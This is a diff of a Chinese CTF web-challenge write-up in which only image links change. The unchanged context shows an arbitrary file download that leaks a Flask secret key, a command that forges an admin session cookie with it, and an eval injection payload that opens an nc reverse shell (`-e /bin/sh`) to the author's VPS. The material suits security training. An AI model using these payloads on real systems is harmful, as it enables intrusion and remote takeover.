@@ -39,7 +39,7 @@ print(t)
 # 抽老婆
 #session伪造 #任意文件下载
 这里的下载存在任意下载漏洞，我们故意报错可知当前目录为/app
-![](https://gitee.com/Yunxi555/wiki_-photo/raw/main/Pastedimage20250930173317.png)
+![](https://gitea.guetsec.cn/Yunxi/GUETSEC_WIKI_Photo/raw/main/Pastedimage20250930173317.png)
 我们下载app.py
 得到密钥 `tanji_is_A_boy_Yooooooooooooooooooooo!`和一个秘密路径，这时候我们就用jwt解密在修改值在加密回去
 ```
@@ -102,7 +102,7 @@ if __name__ == '__main__':
 ```shell
  python flask_session_cookie_manager3.py encode -s "tanji_is_A_boy_Yooooooooooooooooooooo!" -t "{'current_wifi': '79315f6d857095bf8e8cbdb6ec045830.jpg', 'isadmin': True}"
 ```
-![](https://gitee.com/Yunxi555/wiki_-photo/raw/main/Pastedimage20250930184311.png)
+![](https://gitea.guetsec.cn/Yunxi/GUETSEC_WIKI_Photo/raw/main/Pastedimage20250930184311.png)
 # 一言既出
 #PHPweb/php特性/intval  
 ```
@@ -160,9 +160,9 @@ echo serialize(new Webshell());
 # 算力超群
 #沙箱逃逸
 用findsomething工具找到一个路径`/_calculate`
-![](https://gitee.com/Yunxi555/wiki_-photo/raw/main/Pastedimage20250930195813.png)
+![](https://gitea.guetsec.cn/Yunxi/GUETSEC_WIKI_Photo/raw/main/Pastedimage20250930195813.png)
 试着让除零，学过Java都知道除零会抛出`ZeroDivisionError`
-![](https://gitee.com/Yunxi555/wiki_-photo/raw/main/Pastedimage20250930200011.png)
+![](https://gitea.guetsec.cn/Yunxi/GUETSEC_WIKI_Photo/raw/main/Pastedimage20250930200011.png)
 eval！！！，我们来构造payload,但是这里必须存在操作符，而且还会二次转换，我这里是VPS监听，`/_calculate?number1=1&operator=-&number2=1,__import__ ('os').system(' nc ip 端口 -e /bin/sh')`
 
 # 算力升级
